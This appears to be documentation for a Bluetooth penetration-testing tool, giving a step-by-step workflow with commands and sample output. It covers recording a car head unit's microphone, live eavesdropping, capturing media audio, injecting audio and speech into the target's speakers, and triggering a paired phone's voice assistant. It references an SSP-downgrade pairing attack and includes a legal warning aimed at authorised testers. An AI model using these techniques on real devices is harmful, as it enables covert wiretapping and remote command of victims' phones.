# Audio Eavesdropping Workflow

## Scenario

You've established a Bluetooth pairing with a target device -- typically a car head unit or smart speaker -- and you need to demonstrate the full impact of audio-related attacks. This workflow covers everything from recording cabin microphone audio, to live real-time eavesdropping, to injecting audio through the target's speakers, to triggering the paired phone's voice assistant remotely.

This is the "so what?" demonstration for a Bluetooth penetration test. Clients understand "we extracted contacts" -- but hearing their own conference room played back through laptop speakers makes the risk visceral and undeniable.

**Time estimate:** 5-15 minutes per technique
**Risk level:** High (active interception, requires pairing)

!!! note "Prerequisites"
    - **Active Bluetooth pairing** with the target device (see [Encryption Downgrade](encryption-downgrade.md) for establishing one)
    - **PulseAudio or PipeWire** running on your assessment machine
    - **Audio tools** available: `pactl`, `parecord`, `paplay` (install with `sudo apt install pulseaudio-utils`)
    - **Root access** for Blue-Tap commands
    - Optional: `espeak-ng` for text-to-speech injection (`sudo apt install espeak-ng`)
    - Optional: headphones (strongly recommended for live eavesdropping to avoid feedback)

!!! danger "Legal Warning"
    Recording audio from a device without consent is **illegal in most jurisdictions** -- including one-party consent states/countries if you are not a party to the conversation. Wiretapping laws carry serious criminal penalties. **Always** ensure:

    - You have **explicit written authorization** from the device owner
    - The authorization specifically covers **audio interception**
    - You are operating under a formal **rules of engagement** document
    - You understand the applicable laws in your jurisdiction

    Blue-Tap includes these capabilities for authorized security testing only.

---

## Step 1: Verify Audio Stack

Before touching Bluetooth, confirm your local audio system is working:

```bash
$ pactl info | grep -E "Server|Default"
Server String: /run/user/1000/pulse/native
Default Sink: alsa_output.pci-0000_00_1f.3.analog-stereo
Default Source: alsa_input.pci-0000_00_1f.3.analog-stereo
```

**What happened:** Confirmed PulseAudio/PipeWire is running and has a default sink (speakers/headphones) and source (microphone). Both are needed -- the sink for live playback, the source isn't used (Bluetooth provides its own source).

**Decision point:**

- **If `pactl info` fails** -- PulseAudio isn't running. Start it with `pulseaudio --start` or check PipeWire with `systemctl --user status pipewire-pulse`.
- **If no default sink/source** -- run `pactl list short sinks` and `pactl list short sources` to see what's available.

Now verify the Bluetooth pairing:

```bash
$ bluetoothctl paired-devices
Device AA:BB:CC:DD:EE:FF IVI-Headunit
Device 11:22:33:44:55:66 Galaxy S24
```

**Decision point:**

- **If your target appears** -- proceed to Step 2.
- **If not paired** -- you need to establish a pairing first. Run `sudo blue-tap exploit AA:BB:CC:DD:EE:FF ssp-downgrade --method downgrade_and_brute` (see [Encryption Downgrade](encryption-downgrade.md)) or pair manually with `bluetoothctl pair AA:BB:CC:DD:EE:FF`.

---

## Step 2: Check Audio Connection Status

Query the current audio profile state on the target:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action status
[*] Querying audio status for AA:BB:CC:DD:EE:FF (IVI-Headunit)...

  Profile   | Status      | Codec   | Details
 -----------|-------------|---------|----------------------------------
  HFP       | Connected   | mSBC    | SCO link ready, AG role
  A2DP      | Connected   | SBC     | Sink mode, 44.1 kHz stereo
  AVRCP     | Connected   | --      | Target role, media control ready

  Audio Routes:
    Bluetooth source: bluez_source.AA_BB_CC_DD_EE_FF.headset_head_unit
    Bluetooth sink:   bluez_sink.AA_BB_CC_DD_EE_FF.a2dp_sink

[+] All audio profiles active.
```

**What happened:** Blue-Tap queried the Bluetooth audio profiles. HFP (hands-free) is connected with mSBC codec -- this gives us access to the car's microphone. A2DP is connected with SBC codec -- this lets us capture or inject media audio.

| Field | Meaning |
|-------|---------|
| HFP connected | Hands-free profile active (call audio, microphone access) |
| A2DP connected | Media profile active (music streaming, audio injection) |
| Codec | CVSD or mSBC (HFP); SBC, AAC, or aptX (A2DP) |
| SCO link | Synchronous connection for voice audio |

**Decision point:**

- **If HFP shows "Disconnected"** -- the head unit may not have HFP enabled, or another phone is occupying the HFP slot. Try `bluetoothctl connect AA:BB:CC:DD:EE:FF` to re-establish.
- **If A2DP shows "Disconnected"** -- same approach. Some devices only connect the profile that was last active.
- **If codecs show CVSD instead of mSBC** -- audio quality will be lower (8 kHz vs 16 kHz) but the attack still works.

---

## Step 3: Record Car Microphone (HFP)

Capture audio from the target's microphone. This is the core eavesdropping capability:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action record -d 60
[*] Establishing HFP SCO connection to AA:BB:CC:DD:EE:FF...
[*] Codec negotiated: mSBC (16 kHz, mono, S16LE)
[*] Recording from target microphone...
[*] Recording: 60s ████████████████████████████████ 100%
[+] Recording complete.
[+] Saved to: sessions/ivi-pentest-20260416/audio/recording-20260416-152347.wav

  File:      recording-20260416-152347.wav
  Duration:  60.0s
  Format:    WAV, 16 kHz, mono, 16-bit
  Size:      1.88 MB
  Peak dBFS: -12.3 dB
```

**What happened:** Blue-Tap established a Synchronous Connection-Oriented (SCO) link over HFP, which routes the target's microphone audio to your machine. The audio was saved as a WAV file in the session artifacts directory.

**Audio format depends on negotiated codec:**

| Codec | Sample Rate | Channels | Bit Depth | File Size / Minute |
|-------|-------------|----------|-----------|-------------------|
| CVSD | 8 kHz | Mono | S16LE | ~960 KB |
| mSBC | 16 kHz | Mono | S16LE | ~1.88 MB |

**Verifying audio quality:** Play back the recording to confirm it captured usable audio:

```bash
$ paplay sessions/ivi-pentest-20260416/audio/recording-20260416-152347.wav
```

**Decision point:**

- **If the recording sounds clear** -- the eavesdropping attack is proven. Include the recording (or a screenshot of the waveform) in your report.
- **If the recording is silent** -- the SCO link may have been established but the microphone isn't active. Some head units only route the microphone during an active call. Try triggering a call first, or use `--action live` (Step 4) to monitor in real time.
- **If the recording is choppy/distorted** -- RF interference or distance. Move closer to the target. Check for 2.4 GHz Wi-Fi interference.

!!! tip
    Increase duration with `-d 300` for 5-minute recordings. For long-running captures during a meeting, use `-d 3600` (1 hour, ~113 MB at mSBC).

---

## Step 4: Live Eavesdrop (Real-Time Playback)

Stream the target's microphone audio to your speakers in real time:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action live
[*] Establishing HFP SCO connection to AA:BB:CC:DD:EE:FF...
[*] Codec: mSBC (16 kHz, mono)
[*] Routing audio to default sink: alsa_output.pci-0000_00_1f.3.analog-stereo
[*] Live eavesdropping active. Press Ctrl+C to stop.
[*] Level: ▁▂▃▅▃▂▁▂▃▆▅▃▂▁  Peak: -14.2 dBFS
```

**What happened:** Same SCO link as recording, but audio is piped directly to your speakers/headphones instead of a file. The level meter shows real-time audio amplitude so you can confirm the microphone is picking up sound.

Press `Ctrl+C` to stop:

```bash
^C
[*] Live eavesdrop stopped.
[+] Duration: 4m 23s
[+] No recording saved (live mode).
```

!!! tip
    Use headphones to avoid feedback loops. Adjust volume before starting: `pactl set-sink-volume @DEFAULT_SINK@ 80%`

---

## Step 5: A2DP Media Capture

Capture the media audio stream -- whatever music, navigation, or call audio is playing through the target's speakers:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action capture-media
[*] Connecting to A2DP source on AA:BB:CC:DD:EE:FF...
[*] Codec: SBC (44.1 kHz, stereo)
[*] Capturing media stream... Press Ctrl+C to stop.
[*] Capturing: 02:15 elapsed, 23.4 MB written
^C
[+] Capture stopped.
[+] Saved to: sessions/ivi-pentest-20260416/audio/media-capture-20260416-153201.wav

  File:      media-capture-20260416-153201.wav
  Duration:  2m 15s
  Format:    WAV, 44.1 kHz, stereo, 16-bit
  Size:      23.4 MB
```

**What happened:** Blue-Tap captured the A2DP audio stream at source quality. This records whatever audio the paired phone is sending to the head unit -- music, podcast, navigation voice, or phone call audio routed through the car speakers.

| Codec | Sample Rate | Channels | File Size / Minute |
|-------|-------------|----------|-------------------|
| SBC | 44.1 kHz | Stereo | ~10.4 MB |
| AAC | 44.1 kHz | Stereo | ~10.4 MB (decoded) |
| aptX | 44.1 kHz | Stereo | ~10.4 MB (decoded) |

---

## Step 6: Audio Injection (Play to Target Speakers)

Inject an audio file so it plays through the target's speakers:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action inject --file alert.wav
[*] Connecting to A2DP sink on AA:BB:CC:DD:EE:FF...
[*] Codec: SBC (44.1 kHz, stereo)
[*] Injecting audio: alert.wav (duration: 3.2s, size: 564 KB)
[*] Streaming ████████████████████████████████ 100%
[+] Audio injection complete.
```

**What happened:** The audio file was streamed over A2DP to the target as if it were media from the connected phone. The target's speakers played the injected audio. Supported input formats: WAV, MP3, OGG.

!!! warning
    Audio injection replaces the current media stream. The target user will hear your injected audio instead of their music. This is immediately noticeable.

---

## Step 7: Text-to-Speech Injection

Generate speech from text and inject it:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action tts \
    --text "Vehicle security test in progress"
[*] Generating TTS audio via espeak-ng...
[*] Generated: 2.8s of audio
[*] Connecting to A2DP sink on AA:BB:CC:DD:EE:FF...
[*] Injecting TTS audio...
[+] TTS injection complete.
```

**What happened:** Blue-Tap used the local TTS engine to synthesize speech, then injected it over A2DP. The target's speakers spoke the text aloud.

!!! tip
    Requires `espeak-ng` or `piper-tts` installed. Install with `sudo apt install espeak-ng`.

---

## Step 8: Trigger Voice Assistant

Send an AT command to activate the paired phone's voice assistant:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action voice-assistant --enable
[*] Sending AT+BVRA=1 over HFP AT command channel...
[+] Voice assistant activation sent.
[*] Target phone should now show voice assistant UI.
```

**What happened:** The HFP profile includes AT commands for voice recognition. `AT+BVRA=1` tells the phone to activate its voice assistant (Siri, Google Assistant, Bixby). The phone will open the voice assistant as if the user pressed the microphone button on the steering wheel.

To deactivate:

```bash
$ sudo blue-tap extract AA:BB:CC:DD:EE:FF audio --action voice-assistant --disable
[*] Sending AT+BVRA=0 over HFP AT command channel...
[+] Voice assistant deactivation sent.
```

!!! danger
    Triggering the voice assistant on someone's phone can execute commands, make calls, or send messages. Combined with TTS injection over HFP (not A2DP), an attacker could speak commands to the voice assistant through the car's own speakers. Use only in authorized testing.

---

## Attack Chain Summary

```
1. Establish pairing (or leverage existing)
        |
2. Connect HFP ──────────────────────┐
        |                             |
3. Record microphone (passive)   4. Live eavesdrop (real-time)
        |
5. Connect A2DP ──────────────────────┐
        |                             |
6. Capture media stream          7. Inject audio / TTS
        |
8. Trigger voice assistant (AT+BVRA)
```

---

## Summary

This workflow demonstrates the complete audio attack surface over Bluetooth:

| Technique | Profile | Direction | Impact |
|-----------|---------|-----------|--------|
| Microphone recording | HFP | Target -> Attacker | Eavesdrop on conversations |
| Live eavesdrop | HFP | Target -> Attacker | Real-time monitoring |
| Media capture | A2DP | Target -> Attacker | Intercept music/calls/navigation |
| Audio injection | A2DP | Attacker -> Target | Play arbitrary audio on target speakers |
| TTS injection | A2DP | Attacker -> Target | Speak arbitrary text through target |
| Voice assistant | HFP | Attacker -> Phone | Trigger Siri/Google/Bixby remotely |

The key takeaway for clients: once a Bluetooth pairing is established (legitimately or through SSP downgrade), the attacker has full bidirectional audio control -- they can listen, record, inject, and command.

---

## Troubleshooting

| Problem | Cause | Fix |
|---------|-------|-----|
| No audio captured | SCO link not established | Check `pactl list short sources` for a `bluez_source.*` entry |
| Recording is silent | Microphone not active | Some IVIs only activate mic during a call; try initiating a call first |
| Choppy audio | Codec mismatch or RF interference | Move closer to target; check for Wi-Fi on 2.4 GHz band |
| Injection is silent | A2DP not in sink mode | Verify A2DP connection with `--action status`; reconnect if needed |
| Voice assistant no response | AT commands unsupported | Target may not support HFP voice recognition; check `--action status` |
| `parecord` not found | PulseAudio tools missing | `sudo apt install pulseaudio-utils` |
| Low audio volume | Default sink volume too low | `pactl set-sink-volume @DEFAULT_SINK@ 100%` |
| Wrong audio device | Multiple sinks/sources | Specify sink: `pactl set-default-sink <name>` |

---

## What's Next?

- [Encryption Downgrade Workflow](encryption-downgrade.md) -- if you need to establish a pairing first via SSP downgrade
- [Full Penetration Test](full-pentest.md) -- integrate audio attacks into a complete assessment
- [Custom Playbooks](custom-playbooks.md) -- automate the audio attack chain into a repeatable playbook
